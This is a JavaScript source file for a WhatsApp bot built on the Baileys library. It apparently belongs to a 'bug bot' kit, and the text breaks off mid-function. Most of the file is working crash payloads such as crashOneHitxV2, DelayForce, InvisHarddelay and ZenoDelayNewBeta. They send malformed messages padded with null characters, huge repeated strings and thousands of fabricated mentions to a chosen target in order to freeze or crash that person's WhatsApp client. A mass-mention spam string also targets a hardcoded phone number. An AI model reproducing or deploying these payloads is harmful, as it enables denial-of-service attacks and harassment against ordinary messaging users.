
process.on('uncaughtException', console.error)
require("./config")
const { generateMessageID, generateMessageIDV2, WA_DEFAULT_EPHEMERAL, encodeSignedDeviceIdentity, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@whiskeysockets/baileys")
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const pino = require('pino')
const logger = pino({ level: 'debug' });
const JSConfuser = require("js-confuser");
const crypto = require('crypto');
const path = require('path')
//const express = require('express');
const ms = require('ms');
const os = require('os')
 
/*const app = express();
const PORT = process.env.PORT || 3000;*/

module.exports = async (XeonBotInc, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./lib2/myfunc')
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (XeonBotInc.user.id.split(':')[0]+'@s.whatsapp.net' || XeonBotInc.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...(global.db.data.owners || [])].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const isDeveloper = (m && m.sender && (global.db.data.owners || []).map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)


const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isReact = m.message.reactionMessage ? true : false 

//===============[DATABASE]=====================\\
		try {
			let isNumber = x => typeof x === 'number' && !isNaN(x)
			let user = global.db.data.users[m.sender]
			if (typeof user !== 'object') global.db.data.users[m.sender] = {}
			if (user) {
				if (!isNumber(user.premiumExpiry)) user.premiumExpiry = 0
			} else global.db.data.users[m.sender] = {
				premiumExpiry: 0
			}
			
			let setting = global.db.data.settings[botNumber]
			if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
            if (!('antiswview' in setting)) setting.antiswview = false
            } else global.db.data.settings[botNumber] = {
               antiswview: false,
            }
		} catch (e) {
			console.log(e)
		}
		//=====\\
const cd = require('./lib2/countdown')
let usersdb = global.db.data.users
fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2))
const isPremium = isCreator ? true : cd.isPremium(usersdb, m.sender)
const isRentBotUser = isDeveloper ? true : cd.isPremium(usersdb, m.sender)
//====================================\\
//bug
xeontex = "\n " + (args.join(" ") ? args.join(" ") : "Telegram: @lo_tus_19") + "\n\n\n";
    jidds = [];
    xeontex += "*~@201286008203~*\n*🦄*\n*~@201286008203~*\n".repeat(10200);
    jidds.push("201286008203@s.whatsapp.net", "201286008203@s.whatsapp.net");
//bug database
const { xeontext1 } = require('./69/xeontext1')
const { xeontext2 } = require('./69/xeontext2')
const { xeontext3 } = require('./69/xeontext3')
const { xeontext4 } = require('./69/xeontext4')
const { xeontext5 } = require('./69/xeontext5')
const { xeontext6 } = require('./69/xeontext6')
const { xeontext7 } = require('./69/xeontext7')
const { xeontext8 } = require('./69/xeontext8')
const { xeontext9 } = require('./69/xeontext9')
const { xeontext10 } = require('./69/xeontext10')
const { xeontext11 } = require('./69/xeontext11')
const { xeonbeta1, xeonbeta2, xeonyx } = require("./69/xeontext13.js")
const wkwk = fs.readFileSync(`./69/x.mp3`)
const xsteek = fs.readFileSync(`./69/x.webp`)
const o = fs.readFileSync(`./69/o.jpg`)
// No Need to Do Anything If You Don't Want Errors

//time
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var xeonytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 } 
 
 function sendMessageWithMentions2(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return XeonBotInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return XeonBotInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return XeonBotInc.sendMessage(m.chat, {
                        text: text,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [mentions],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363422217202244@g.us",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://mega.nz/file/DtgDBAZK#TvUFm5Vzu81o1HinHpo0f5UK_4MJ_z0zoN3rUmX5GVY",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: false
}
}
                        }, {quoted:m})
  } else {
    return XeonBotInc.sendMessage(m.chat, {
                        text: text,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [mentions],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363422217202244@g.us",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://mega.nz/file/DtgDBAZK#TvUFm5Vzu81o1HinHpo0f5UK_4MJ_z0zoN3rUmX5GVY",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: false
}
}
                        }, {quoted:m})
  }
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

//group chat msg by xeon
const replygcxeon2 = (teks) => {
	XeonBotInc.sendMessage(m.chat, {
                        text: teks,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363422217202244@g.us",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://mega.nz/file/DtgDBAZK#TvUFm5Vzu81o1HinHpo0f5UK_4MJ_z0zoN3rUmX5GVY",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: true
}
}
                        }, {quoted:m})

}

const replygcxeon = (teks) => {
	XeonBotInc.sendMessage(m.chat, {
                        text: teks,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363422217202244@g.us",
}
}
                        }, {quoted:m})

}
   
//self public
if (!XeonBotInc.public) {
if (!isCreator) return
}

if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('XeonBug21.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('There is an error:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `Sorry, the command you gave is wrong. Maybe this is what you mean:\n\n•> ${prefix+mean}\n•> Similarities: ${similarityPercentage}%`
replygcxeon(response)
}}   
//==============================================================\\
// مثال مصحح لإرسال نص مرئي + جعله مقتبسا من "stickerMessage" مرفق بالميتا
async function crashOneHitxV2(XeonBotInc, target, count = 100, delay = 300) {
  const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

  const heavyPayload = () => {
    const chars = "\u0010\u0000\uFFFF\uD83D\uDE80";
    return Array(0x2000)
      .fill(0)
      .map(() => chars[Math.floor(Math.random() * chars.length)])
      .join("");
  };

  const messageTemplate = () => ({
    interactiveMessage: {
      body: { text: "-sock { null - executor }" },
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_method",
            buttonParamsJson: JSON.stringify({
              reference_id: heavyPayload(),
              payment_method: heavyPayload(),
              payment_timestamp: Date.now(),
              share_payment_status: true,
            }),
          },
        ],
        messageParamsJson: heavyPayload(),
      },
    },
  });

  for (let i = 0; i < count; i++) {
    try {
      const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: messageTemplate() }
      }, {});

      await XeonBotInc.relayMessage(target, msg.message, { messageId: msg.key.id });

      console.log(`[crashOneHitxV2] Sent ${i + 1}/${count}`);

      if (i < count - 1) {
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    } catch (err) {
      console.error(`[crashOneHitxV2] Error at ${i + 1}:`, err);
    }
  }
}


async function DelayHard(sock, target) {
    const stickerMsg = {
  message: {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/d/f/A1B2C3D4E5F6G7H8I9J0.webp?ccb=11-4",
      mimetype: "image/webp",
      fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
      fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
      mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
      fileLength: 1173741,
      mediaKeyTimestamp: Date.now(),
      isAnimated: false,
      directPath: "/v/t62.7118-24/sample_sticker.enc",
      contextInfo: {
        mentionedJid: [
          target,
          ...Array.from({ length: 50 }, () =>
            "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
        ],
        participant: target,
        remoteJid: "status@broadcast",
      },
    },
  },
};

const msg = generateWAMessageFromContent(target, stickerMsg.message, {});

await XeonBotInc.relayMessage("status@broadcast", msg.message, {
  messageId: msg.key.id,
  statusJidList: [target],
  additionalNodes: [
    {
      tag: "meta",
      attrs: {},
      content: [
        {
          tag: "mentioned_users",
          attrs: {},
          content: [
            {
              tag: "to",
              attrs: { jid: target },
              content: []
            },
          ],
        },
      ],
    },
  ],
});

console.log("✅ Sticker berhasil dikirim tanpa error.");
}
async function ZenoDelayNewBeta(target, ptcp = true) {
  const VariabelJid = "0@s.whatsapp.net";
  const imageMsg = {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
    fileLength: "99999999",
    height: 9999,
    width: 9999,
    mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
    fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
    directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1755254367",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyy4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgETHERQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAREgABASMP/aAAgBAwEBPwCz5LGdFYN//9k=",
    caption: "\u0000".repeat(104500),
  };

  let msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        albumMessage: {
          expectedImageCount: 666,
          expectedVideoCount: 0,
          items: [
            { 
              imageMessage: imageMsg 
            }
          ],
          contextInfo: {
            mentionedJid: [
              "01096379348@s.whatsapp.net",
              ...Array.from({ length: 1900 }, 
              () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
              )
            ],
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            stanzaId: "1234567890ABCDEF",
            businessMessageForwardInfo: {
              businessOwnerJid: VariabelJid,
            },
          },
        },
      },
    },
  }, {});
  
  await XeonBotInc.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message,
     },
    }, ptcp ? 
    { 
      messageId: msg.key.id, 
      participant: { jid: target } 
    } : { messageId: msg.key.id }
  );
  
  const payload = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "𝗫 - 𝗭 𝗘 𝗡 𝗢", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );
  
  await XeonBotInc.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload.message,
     },
    }, ptcp ? 
    { 
      messageId: payload.key.id, 
      participant: { jid: target } 
    } : { messageId: payload.key.id }
  );
}

async function delayhardinvisible(target, ptcp = true) {
  const VariabelJid = "0@s.whatsapp.net";
  const imageMsg = {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
    fileLength: "99999999",
    height: 9999,
    width: 9999,
    mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
    fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
    directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1755254367",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyy4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgETHERQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAREgABASMP/aAAgBAwEBPwCz5LGdFYN//9k=",
    caption: "\u0000".repeat(104500),
  };

  let msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        albumMessage: {
          expectedImageCount: 666,
          expectedVideoCount: 0,
          items: [
            { 
              imageMessage: imageMsg 
            }
          ],
          contextInfo: {
            mentionedJid: [
              "01096379348@s.whatsapp.net",
              ...Array.from({ length: 1900 }, 
              () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
              )
            ],
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            stanzaId: "1234567890ABCDEF",
            businessMessageForwardInfo: {
              businessOwnerJid: VariabelJid,
            },
          },
        },
      },
    },
  }, {});
  
  await XeonBotInc.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message,
     },
    }, ptcp ? 
    { 
      messageId: msg.key.id, 
      participant: { jid: target } 
    } : { messageId: msg.key.id }
  );
  
  const payload = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "⤷ 𝚈𝚘𝚞𝚛 𝚂𝙰𝙱𝙸𝚁⁷⁷¹⁸ ⤶", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );
  
  await XeonBotInc.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload.message,
     },
    }, ptcp ? 
    { 
      messageId: payload.key.id, 
      participant: { jid: target } 
    } : { messageId: payload.key.id }
  );
}

async function BoldType(sock, target) {
    let ZhTxRukaMsg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "ZhT | BODY - Ex3cutor",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, 
      {
        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    }
  );

    await XeonBotInc.relayMessage("status@broadcast", ZhTxRukaMsg.message, {
        messageId: ZhTxRukaMsg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    console.log(chalk.red(`Succes Sending Bug By BODY To ${target}`));
}
async function sayRepeat(XeonBotInc, chatId, message, count) {
    for (let i = 0; i < count; i++) {
        await XeonBotInc.sendMessage(chatId, { text: message });
        await new Promise(resolve => setTimeout(resolve, 200));
    }
}
async function InvisHarddelay(target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "Telegram@lo_tus_19",
                    contentText:
                        "INVISHARDER",
                    footerText: "InvisibleHard༑",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "🇷🇺" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await XeonBotInc.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await XeonBotInc.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "InvisHarder" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }

async function DelayForce(target) {
    let crash = JSON.stringify({
      action: "x",
      data: "x"
    });
  
    await XeonBotInc.relayMessage(target, {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "BODY" + "ꦾ".repeat(77777),
      publisher: "BODY",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "Jawa Jawa",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
     remoteJid: "X",
      participant: "0@s.whatsapp.net",
      stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED",
      quotedMessage: {
      callLogMesssage: {
      isVideo: true,
      callOutcome: "REJECTED",
      durationSecs: "1",
      callType: "SCHEDULED_CALL",
       participants: [
           { jid: target, callOutcome: "CONNECTED" },
               { target: "0@s.whatsapp.net", callOutcome: "REJECTED" },
               { target: "01096379348@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
               { target: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                ]
              }
            },
         }
 }, {});
 
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "𝗠𝗜𝗗𝗢" + "ꦾ",
          listType: 4,
          buttonText: { displayText: "🩸" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "⌜⌟"
          },
          contextInfo: {
            mentionedJid: [target],
            participant: "0@s.whatsapp.net",
            remoteJid: "who know's ?",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
            externalAdReply: {
              title: "☀️",
              body: "🩸",
              mediaType: 1,
              renderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "payment_info",
                  buttonParamsJson: crash
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: crash
                },
              ],
            },
            extendedTextMessage: {
            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "𝗠𝗜𝗗𝗢" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
           participant: target, 
          }
        }
      }
    }
  }, {})
  await XeonBotInc.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
  console.log(chalk.red(`Succes Send Bug To ${target}`));
}


async function callCrash(target, isVideo = true) {
  const { jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require("@whiskeysockets/baileys");
  
  try {
    const devices = (
      await XeonBotInc.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await XeonBotInc.assertSessions(devices);

    const createMutex = () => {
      const locks = new Map();
      
      return {
        async mutex(key, fn) {
          while (locks.has(key)) {
            await locks.get(key);
          }
          
          const lock = Promise.resolve().then(() => fn());
          locks.set(key, lock);
          
          try {
            const result = await lock;
            return result;
          } finally {
            locks.delete(key);
          }
        }
      };
    };

    const mutexManager = createMutex();
    
    const appendBufferMarker = (buffer) => {
      const newBuffer = Buffer.alloc(buffer.length + 8);
      buffer.copy(newBuffer);
      newBuffer.fill(1, buffer.length);
      return newBuffer;
    };

    const originalCreateParticipantNodes = XeonBotInc.createParticipantNodes?.bind(XeonBotInc);
